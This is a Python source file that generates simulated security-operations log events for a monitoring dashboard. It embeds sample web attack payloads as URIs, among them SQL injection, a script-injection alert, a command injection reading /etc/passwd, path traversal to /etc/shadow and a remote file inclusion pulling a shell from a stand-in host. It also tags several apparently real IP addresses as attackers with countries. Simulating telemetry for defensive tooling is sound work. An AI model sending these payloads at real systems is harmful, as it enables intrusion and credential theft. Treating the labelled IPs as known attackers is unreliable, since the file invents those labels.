import time
import random
from datetime import datetime, timezone

class LiveLogGenerator:
    """
    Generates realistic cyber attack events and clean web telemetry to simulate continuous 24/7 SOC operations.
    """
    
    ATTACK_PAYLOADS = [
        {"type": "SQL Injection (SQLi)", "uri": "/login.php?user=admin%27%20OR%201=1--", "rule_id": "942100", "modsec": "CRITICAL"},
        {"type": "Cross-Site Scripting (XSS)", "uri": "/contact.php?name=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E", "rule_id": "941100", "modsec": "HIGH"},
        {"type": "Command Injection (RCE)", "uri": "/admin/system.php?cmd=cat%20/etc/passwd;%20id", "rule_id": "932100", "modsec": "CRITICAL"},
        {"type": "Path Traversal", "uri": "/download.php?file=../../../../etc/shadow", "rule_id": "930100", "modsec": "HIGH"},
        {"type": "File Inclusion", "uri": "/index.php?page=http://malicious-c2.com/shell.txt", "rule_id": "931100", "modsec": "HIGH"},
        {"type": "Brute Force Attack", "uri": "/login.php", "rule_id": "950100", "modsec": "MEDIUM"},
        {"type": "Scanner Detection", "uri": "/.env", "rule_id": "913100", "modsec": "LOW"},
        {"type": "Single 404", "uri": "/nonexistent-page.php", "rule_id": "900001", "modsec": "LOW"},
        {"type": "Suspicious User-Agent", "uri": "/api/v1/users", "rule_id": "920100", "modsec": "LOW"},
        {"type": "Admin Enumeration", "uri": "/admin/config.bak", "rule_id": "930110", "modsec": "MEDIUM"},
    ]

    ATTACKER_IPS = [
        {"ip": "185.220.101.5", "country": "Russia"},
        {"ip": "45.154.255.88", "country": "China"},
        {"ip": "193.142.146.210", "country": "Netherlands"},
        {"ip": "103.251.170.19", "country": "Vietnam"},
        {"ip": "194.26.29.112", "country": "Ukraine"},
        {"ip": "185.191.171.3", "country": "Iran"},
        {"ip": "103.107.198.12", "country": "Indonesia"},
        {"ip": "186.2.163.22", "country": "Brazil"},
        {"ip": "198.51.100.42", "country": "United States"}
    ]

    @classmethod
    def generate_event(cls, id_counter: int) -> dict:
        attack = random.choice(cls.ATTACK_PAYLOADS)
        attacker = random.choice(cls.ATTACKER_IPS)
        
        timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        
        raw_log = f"{attacker['ip']} - - [{timestamp}] \"GET {attack['uri']} HTTP/1.1\" 403 512 \"-\" \"OWASP-CRS-Scanner/3.3\""

        return {
            "id": f"EVT-{id_counter:06d}",
            "timestamp": timestamp,
            "source": random.choice(["modsecurity", "nginx", "wazuh", "fail2ban", "crowdsec"]),
            "client_ip": attacker["ip"],
            "country": attacker["country"],
            "attack_type": attack["type"],
            "uri": attack["uri"],
            "rule_id": attack["rule_id"],
            "modsec_severity": attack["modsec"],
            "raw": raw_log
        }
